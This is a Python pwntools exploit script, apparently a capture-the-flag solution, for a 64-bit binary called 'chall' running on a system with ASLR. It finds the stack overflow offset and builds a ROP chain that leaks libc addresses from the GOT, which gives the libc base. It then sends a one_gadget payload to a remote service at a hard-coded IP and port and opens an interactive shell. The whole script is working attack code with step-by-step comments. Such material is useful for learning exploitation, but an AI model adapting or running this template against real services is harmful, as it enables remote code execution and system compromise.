from pwn import *
from struct import pack

##########################################################################
# My approach to Binary Exploitation on ASLR Enabled systems.
# DOWNLOAD PWNTOOLS TO RUN!
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

nops = b'\x90'
padding = b'\x00'

clean = lambda x: x.split('\n')[1:-2]
pad = lambda x: x + padding*(8-len(x))

##########################################################################
# Load Binaries and Respective libc
#
# To Find the Libc version, make ROP chain to print address of libc
# functions, which are stored in GOT table as values of pointers.
# Just pass the address of pointer to RDI through pop rdi; ret
# And call puts function.
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

elf = ELF('./chall')
context.binary = './chall'
libc = ELF("/home/ashishkumarsingh/HackingTools/libc-database/db/libc6_2.27-3ubuntu1_amd64.so")#("/lib/x86_64-linux-gnu/libc-2.30.so")
# libc  = ELF("/lib/x86_64-linux-gnu/libc-2.30.so")
##########################################################################
# Find Offset
##########################################################################

r = elf.process()
crash = cyclic(4096)
r.recvline()
r.clean()
r.sendline(crash)
r.wait()
core = r.corefile
rsp = core.rsp
offset = core.read(rsp, 4)
offset =  cyclic_find(offset)
success("Offset found @ {a} bytes".format(a=offset))

##########################################################################
# Generate Initial Payload to Leak memory
##########################################################################

### Find manually
crashOffset = offset	

### 0x7fffffffd7e8 is just some random value in stack space, just so RBP is valid
junk = nops*(crashOffset - 8) + p64(0x7fffffffd7e8) # Override RBP
poprdi = p64(0x40126b) # from ROPgadget

### elf.got contains pointers containing actual addresses of query functions
puts = p64(elf.got['puts'])
gets = p64(elf.got['gets'])

# ss = p64(0x2008) # The string ""

### elf.symbols contains addresses of functions (and stubs as here)
putsret = p64(elf.symbols['puts'])
mainret = p64(elf.symbols['main'])
shellcoderet = p64(0x404070)

##########################################################################
# Demo ==> (poprdi + puts + putsret) 
# puts -> pointer of GOT table entry of puts
# putsret -> stub function calling actual puts
# TO FIND LIBC VERSION, use https://libc.blukat.me/
# Use ROPgadget to find gadgets
##########################################################################

### This Payload prints puts and gets addressed and calls main function again
payload = b''.join([junk, \
    poprdi, puts, putsret, \
    poprdi, gets, putsret, \
    mainret])

# r = elf.process()
r = remote('13.233.99.37', 1007)
# gdb.attach(r.pid, """c""")

print(r.readline())
print(r.clean())

r.sendline(payload)
r.readline()
##########################################################################
# Compute Libc Base address from leaked addresses
##########################################################################

puts_leak = u64(pad(r.readline())) & 0x0ffffffffffff
gets_leak = u64(pad(r.readline())) & 0x0ffffffffffff
print("puts: ", hex(puts_leak))
print("gets: ", hex(gets_leak))

puts_offset = libc.symbols['puts']
libc_base = puts_leak - puts_offset
# This address must be 0x1000 aligned, if not, its Probably wrong!
print("libc base: ", hex(libc_base))
if(libc_base & 0x0000000000000fff):
    print("ALERT! Program is probably using different libc than specified!")

##########################################################################
# Now Actual Exploitation!
# Use libc base address to generate address of a one gadget!
# use one_gadget to find one gadgets
##########################################################################

# sys_offset = p64(0x45390 + libc_base)
one_gadget = p64( 0x4f322 + libc_base) # from one_gadget

npayload = b''.join([junk, \
    one_gadget, padding*8])

r.clean()

r.sendline(npayload)
r.readline()
# Get Interactive shell
r.interactive()
